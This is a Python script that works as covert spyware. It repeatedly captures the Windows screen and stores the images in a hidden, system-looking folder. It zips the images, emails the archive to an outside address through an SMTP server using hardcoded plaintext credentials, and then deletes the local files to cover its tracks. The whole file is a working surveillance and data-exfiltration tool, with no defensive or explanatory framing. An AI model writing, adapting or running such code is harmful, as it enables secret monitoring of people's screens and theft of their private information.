
from PIL import ImageGrab
import time
import zipfile
import glob
import os

import smtplib 
from email.mime.text import MIMEText  
from email.header import Header  
from email.mime.multipart import MIMEMultipart  
target_tree = "c:\\windows\\winConfigs"
target_tree2 = "c:\\windows\\winConfigs\\alg"

pic_file = "C:\\windows\\winConfigs\\alg\\pic.zip"

if os.path.exists(target_tree):
	pass
else:
	os.mkdir(target_tree)
	os.mkdir(target_tree2)


#==================================================================================================
def Zip_to_files():	
	pic_zip = zipfile.ZipFile(pic_file,'w',zipfile.ZIP_DEFLATED)
	for files in glob.glob('C:\\WINDOWS\\winConfigs\\alg\\*.png'):
		pic_zip.write(files)
	pic_zip.close()

def Clean_battle():	
	for files in glob.glob('C:\\WINDOWS\\winConfigs\\alg\\*.png'):
		os.remove(files)
	os.remove(pic_file)
	
#==================================================================================================

#bbox = (720-300, 450-300, 720+300, 450+300)
bbox=()
time_in=list()
time_in=time.localtime(time.time())
M=time_in[4]

i=0

while True:
	stamp = (time.strftime('%Y-%m-%d-%H-%M',time.localtime(time.time())));
	filename = "c:\\windows\\winConfigs\\alg\\"+stamp +'.png'
	try:
		img = ImageGrab.grab(bbox)
		img.save(filename)
		time.sleep(5)
		time_in=time.localtime(time.time())
		if(time_in[4]-M==50):           # Minutes
			break
		else:
			continue
		
	except Exception:
		break
	
#=========================================================
Zip_to_files()
#Clean_battle()


sender = 'breave-heart-1@163.com'  
receiver = ['290908182@qq.com'] 
subject = 'test'  
smtpserver = 'smtp.163.com'  
username = 'breave-heart-1'  
password = 'huangdada1927'  
  

msg=MIMEMultipart('related')
msg['Subject'] = Header(subject, 'utf-8')  


att = MIMEText(open(pic_file, 'rb').read(), 'base64', 'utf-8')  
att["Content-Type"] = 'application/octet-stream'  
att["Content-Disposition"] = 'attachment; filename="pic.zip"'  
msg.attach(att) 
#=========================================================
try:
	smtp = smtplib.SMTP()  
	smtp.connect(smtpserver)  
	smtp.login(username, password)  
	smtp.sendmail(sender, receiver, msg.as_string())
	smtp.quit()
	Clean_battle()
except Exception:
	Clean_battle()






	
